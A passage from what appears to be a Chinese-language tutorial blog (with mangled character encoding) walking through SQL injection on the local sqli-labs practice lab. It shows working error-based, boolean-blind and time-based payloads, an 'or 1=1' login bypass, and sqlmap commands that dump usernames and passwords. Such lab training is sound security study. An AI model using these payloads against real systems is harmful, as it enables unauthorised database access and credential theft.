src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128235121970.png" alt="image-20201128235121970"></p><p><strong>8.æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯</strong></p><p>æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯ä¸»è¦æ˜¯åˆ©ç”¨æ•°æ®åº“ä¸­çš„å†…ç½®å‡½æ•°æ¥è·å–ä¿¡æ¯ã€‚</p><ul><li>version()â€”â€”MySQLç‰ˆæœ¬</li><li>user()â€”â€”ç”¨æˆ·å</li><li>database()â€”â€”æ•°æ®åº“å</li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</li><li>@@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</li></ul><h2 id="åˆ©ç”¨Sqlmapæµ‹è¯•"><a href="#åˆ©ç”¨Sqlmapæµ‹è¯•" class="headerlink" title="åˆ©ç”¨Sqlmapæµ‹è¯•"></a><strong>åˆ©ç”¨Sqlmapæµ‹è¯•</strong></h2><p>Sqlmapæ˜¯æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„ä¸€æ¬¾å¼ºå¤§å·¥å…·ã€‚</p><p><strong>1.æŸ¥è¯¢åº“</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129153523160.png" alt="image-20201129153523160"></p><p><strong>2.æŸ¥è¯¢è¡¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154040322.png" alt="image-20201129154040322"></p><p><strong>3.æŸ¥è¯¢å­—æ®µ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154015859.png" alt="image-20201129154015859"></p><p><strong>4.æŸ¥è¯¢æ•°æ®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154914063.png" alt="image-20201129154914063"></p><p><strong>Sqlmapæ£€æµ‹è¿‡ç¨‹ä¸­çš„payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 6535&#x3D;6535 AND &#39;MMEg&#39;&#x3D;&#39;MMEg</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529&#x3D;6529,1))),0x7176767a71)) AND &#39;SxoL&#39;&#x3D;&#39;SxoL</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) AND &#39;aMBL&#39;&#x3D;&#39;aMBL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-3115&#39; UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -</span><br></pre></td></tr></table></figure><h1 id="GET-æŠ¥é”™æ³¨å…¥"><a href="#GET-æŠ¥é”™æ³¨å…¥" class="headerlink" title="GET æŠ¥é”™æ³¨å…¥"></a>GET æŠ¥é”™æ³¨å…¥</h1><p>åœ¨æ²¡æœ‰æ•°æ®å›æ˜¾çš„æ—¶å€™ï¼Œé€šè¿‡æŠ¥é”™æ¥æ˜¾ç¤ºå…·ä½“çš„ä¿¡æ¯</p><p>1.<strong>floor()å‡½æ•°</strong></p><p>åŸç†ï¼š<a href="https://blog.csdn.net/shuteer_xu/article/details/104438405">MysqlæŠ¥é”™æ³¨å…¥ä¹‹å‡½æ•°åˆ†æ</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å…¥å…¬å¼ï¼ˆPayloadä¸ºè‡ªå·±æƒ³è·å–å†…å®¹çš„è„šæœ¬ï¼‰ï¼š</span><br><span class="line">and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æš´åº“</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢è¡¨</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;security&quot; and table_name&#x3D;&quot;users&quot; limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢å­—æ®µ</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢å­—æ®µå†…å®¹</span><br></pre></td></tr></table></figure><p>2.<strong>extractvalue()å‡½æ•°</strong></p><p>extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„) :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><p>æ³¨æ„ï¼šextractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</p><p>extractvalue() å‡½æ•°ä¸æ”¯æŒä½ç‰ˆæœ¬ mysql</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(payload),0x7e))</span><br></pre></td></tr></table></figure><p><strong>3.updatexml()å‡½æ•°</strong></p><p>updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)ï¼šå¯¹xmlæ–‡æ¡£è¿›è¡Œæ›´æ–°çš„å‡½æ•°</p><p>updatexmlå’Œä¸Šé¢çš„extractvlaueå‡½æ•°åŸºæœ¬ä¸Šç›¸å·®ä¸å¤§ï¼Œç”¨æ³•ä¹Ÿç›¸åŒ</p><p>æ³¨ï¼šé«˜ç‰ˆæœ¬çš„mysqlå·²ç»ä¿®å¤äº†è¯¥bug</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure><h1 id="GET-å¸ƒå°”ç›²æ³¨"><a href="#GET-å¸ƒå°”ç›²æ³¨" class="headerlink" title="GET å¸ƒå°”ç›²æ³¨"></a>GET å¸ƒå°”ç›²æ³¨</h1><p>åœ¨æ²¡æœ‰æŠ¥é”™ä¿¡æ¯æ—¶ï¼Œæ ¹æ®é¡µé¢å›æ˜¾æƒ…å†µä¸åŒè€ƒè™‘å¸ƒå°”ç›²æ³¨</p><h2 id="æ‰‹åŠ¨æµ‹è¯•-1"><a href="#æ‰‹åŠ¨æµ‹è¯•-1" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.æ£€æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1     #é¡µé¢æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203312421.png" alt="image-20201130203312421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39;    #æ— æŠ¥é”™ä¿¡æ¯ï¼Œä½†ä¸è¿”å›&quot;You are in......&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203507136.png" alt="image-20201130203507136"></p><p><strong>2.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 5--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204339111.png" alt="image-20201130204339111"></p><p><strong>length(str)</strong>      è¿”å›å­—ç¬¦ä¸²é•¿åº¦</p><p>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜åº“åé•¿åº¦å¤§äº5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 10--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204918453.png" alt="image-20201130204918453"></p><p>ç»§ç»­åˆ¤æ–­åº“åé•¿åº¦ï¼Œæ­¤é¡µé¢è¡¨ç¤ºå…¶å°äº10</p><p>ç¼©å°èŒƒå›´åˆ¤æ–­ï¼Œå¾—å‡ºå½“å‰åº“åé•¿åº¦ä¸º8</p><p><strong>3.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1)) &#x3D; 115--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130205353557.png" alt="image-20201130205353557"></p><p><strong>ASCII(s)</strong>      è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç </p><p><strong>SUBSTR(s, n, len)</strong>      ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p><p>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯115ï¼Œå¯¹åº”s</p><p>â€¦â€¦.æ›´æ”¹ä½ç½®ï¼Œé€æ­¥å¾—å‡ºåº“åsecurity</p><p>â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œå¾—å‡ºå…¶ä»–æ•°æ®</p><h2 id="åˆ©ç”¨burpsuiteæµ‹è¯•"><a href="#åˆ©ç”¨burpsuiteæµ‹è¯•" class="headerlink" title="åˆ©ç”¨burpsuiteæµ‹è¯•"></a><strong>åˆ©ç”¨burpsuiteæµ‹è¯•</strong></h2><p>å¯¹ä¸Šé¢ç¬¬ä¸‰æ­¥è¿›è¡ŒæŠ“åŒ…ï¼Œä½¿ç”¨intruderæ¨¡å—</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162311335.png" alt="image-20201209162311335"></p><p>è®¾ç½®payloads</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162508699.png" alt="image-20201209162508699"></p><p>start attack</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209163040562.png" alt="image-20201209163040562"></p><h1 id="GET-æ—¶é—´ç›²æ³¨"><a href="#GET-æ—¶é—´ç›²æ³¨" class="headerlink" title="GET æ—¶é—´ç›²æ³¨"></a>GET æ—¶é—´ç›²æ³¨</h1><p>å½“é¡µé¢å›æ˜¾å†…å®¹å®Œå…¨ä¸€è‡´ï¼Œè€ƒè™‘æ—¶é—´ç›²æ³¨</p><h2 id="æ‰‹åŠ¨æµ‹è¯•-2"><a href="#æ‰‹åŠ¨æµ‹è¯•-2" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.æ£€æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(10))--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129174459638.png" alt="image-20201129174459638"></p><p><strong>ifï¼ˆexpression,a,bï¼‰</strong>  expressionæ¡ä»¶ä¸ºçœŸè¿”å›a,æ¡ä»¶ä¸ºå‡è¿”å›b</p><p>F12æŸ¥çœ‹networkä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å»¶è¿Ÿäº†10ç§’ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹</p><p><strong>2.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175046395.png" alt="image-20201129175046395"></p><p>å»¶è¿Ÿ10ç§’ï¼Œè¯´æ˜åˆ¤æ–­æˆåŠŸï¼Œå½“å‰æ•°æ®åº“é•¿åº¦ä¸º8</p><p><strong>3.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175759624.png" alt="image-20201129175759624"></p><p>å»¶è¿Ÿ10ç§’ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯115ï¼Œå¯¹åº”s</p><p>â€¦â€¦.æ›´æ”¹ä½ç½®ï¼Œé€æ­¥å¾—å‡ºåº“åsecurity</p><p>â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œå¾—å‡ºå…¶ä»–æ•°æ®</p><h2 id="Sqlmapä¸‹æµ‹è¯•"><a href="#Sqlmapä¸‹æµ‹è¯•" class="headerlink" title="Sqlmapä¸‹æµ‹è¯•"></a><strong>Sqlmapä¸‹æµ‹è¯•</strong></h2><p>æŸ¥è¯¢åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --technique B --dbs --batch   #å¸ƒå°”å‹ç›²æ³¨</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&quot; --technique T --dbs --batch   #æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 1071&#x3D;1071 AND &#39;MFtC&#39;&#x3D;&#39;MFtC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND &#39;VpPN&#39;&#x3D;&#39;VpPN</span><br></pre></td></tr></table></figure><p>åç»­æ­¥éª¤ä¸ä¸Šè¿°Sqlmapæµ‹è¯•æ–¹æ³•ä¸€è‡´</p><p>â€¦â€¦</p><h1 id="POST-æŠ¥é”™æ³¨å…¥"><a href="#POST-æŠ¥é”™æ³¨å…¥" class="headerlink" title="POST æŠ¥é”™æ³¨å…¥"></a>POST æŠ¥é”™æ³¨å…¥</h1><h2 id="æ‰‹åŠ¨æµ‹è¯•-3"><a href="#æ‰‹åŠ¨æµ‹è¯•-3" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>é€šè¿‡SQLçš„orè¿ç®—ç¬¦ï¼Œæ„é€ ä¸‡èƒ½å¯†ç ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ³¨å…¥ç‚¹</strong></p><p>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼ˆæ·»åŠ å•å¼•å·åæŠ¥é”™ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203161208957.png" alt="image-20201203161208957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or 1&#x3D;1--+&amp;passwd&#x3D;123456 æ„é€ ä¸‡èƒ½å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230449498.png" alt="image-20201202230449498"></p><p>åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥,å¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ç­‰ï¼Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„ç›¸å…³ä¿¡æ¯</p><p>å¦‚åˆ©ç”¨æŠ¥é”™æ³¨å…¥è·å–å½“å‰æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(database()),0x7e))--+&amp;passwd&#x3D;123456</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230243117.png" alt="image-20201202230243117"></p><p>â€¦â€¦</p><h2 id="åˆ©ç”¨burp-suiteæµ‹è¯•"><a href="#åˆ©ç”¨burp-suiteæµ‹è¯•" class="headerlink" title="åˆ©ç”¨burp suiteæµ‹è¯•"></a><strong>åˆ©ç”¨burp suiteæµ‹è¯•</strong></h2><p><strong>ä½¿ç”¨ProxyåŠŸèƒ½æŠ“åŒ…</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230900185.png" alt="image-20201202230900185"></p><p><strong>ä½¿ç”¨RepeateråŠŸèƒ½</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231127632.png" alt="image-20201202231127632"></p><p><strong>æ„é€ ä¸‡èƒ½å¯†ç </strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231557574.png" alt="image-20201202231557574"></p><h2 id="åˆ©ç”¨Sqlmapæµ‹è¯•-1"><a href="#åˆ©ç”¨Sqlmapæµ‹è¯•-1" class="headerlink" title="åˆ©ç”¨Sqlmapæµ‹è¯•"></a>åˆ©ç”¨Sqlmapæµ‹è¯•</h2><p>å¤åˆ¶Burpsuiteæˆªæ–­çš„HTTPè¯·æ±‚æ•°æ®åŒ…åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨<strong>Sqlmap -r æ–‡ä»¶è·¯å¾„ -p æŒ‡å®šæ¢æµ‹å‚æ•°</strong></p><p>è¿™é‡Œå¤åˆ¶æ•°æ®åŒ…è‡³sqlmapç›®å½•ä¸‹çš„target.txtæ–‡ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000201440.png" alt="image-20201203000201440"></p><p>åœ¨Sqlmapä¸­æŒ‡å®šæ¢æµ‹æŠ€æœ¯ä½¿ç”¨â€“technique  BEUSTQ</p><p><strong>â€“technique E</strong> åŸºäºæŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000800804.png" alt="image-20201203000800804"></p><p><strong>payloadï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: passwd (POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&amp;passwd&#x3D;123456&#39; AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356&#x3D;7356,1))),0x7176706a71),7356)-- lpbw&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>å…¶åæ·»åŠ å‚æ•°ä»¥è·å–å…¶ä»–ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --dbs</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security --tables</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h1 id="POST-å¸ƒå°”ã€æ—¶é—´ç›²æ³¨"><a href="#POST-å¸ƒå°”ã€æ—¶é—´ç›²æ³¨" class="headerlink" title="POST å¸ƒå°”ã€æ—¶é—´ç›²æ³¨"></a>POST å¸ƒå°”ã€æ—¶é—´ç›²æ³¨</h1><p>åœ¨adminåæ·»åŠ å•å¼•å·ç­‰å­—ç¬¦åå¹¶æ— æŠ¥é”™ä¿¡æ¯ï¼Œè€ƒè™‘ç›²æ³¨</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203162418352.png" alt="image-20201203162418352"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (payload)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(payload)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br><span class="line">&#x2F;&#x2F;å¦‚ uname&#x3D;&#39;or (length(database())&#x3D;8)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(ascii(substr(database(),1,1))&#x3D;115)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210213730100.png" alt="image-20201210213730100"></p><p><strong>åˆ©ç”¨burpsuiteæŠ“å–æ•°æ®åŒ…</strong>ï¼Œåœ¨å­˜åœ¨æ³¨å…¥ç‚¹POSTæäº¤çš„å‚æ•°ååŠ å…¥åˆ¤æ–­è¯­å¥ï¼Œæ ¹æ®Responseçš„ç»“æœè·å–ä¿¡æ¯</p><p>å¦‚ä¸‹å›¾ï¼Œåˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦æ˜¯å¦å¤§äº5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164042900.png" alt="image-20201203164042900"></p><p>å†åˆ¤æ–­å…¶é•¿åº¦æ˜¯å¦å¤§äº10</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164228389.png" alt="image-20201203164228389"></p><p>æœ€ååˆ¤æ–­å…¶é•¿åº¦ä¸º8ï¼Œä»¥æ­¤ç±»æ¨ï¼Œåˆ¤æ–­å…¶ä»–ä¿¡æ¯â€¦â€¦</p><p>åŒæ ·ï¼Œä¹Ÿå¯ä»¥è¿›è¡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or 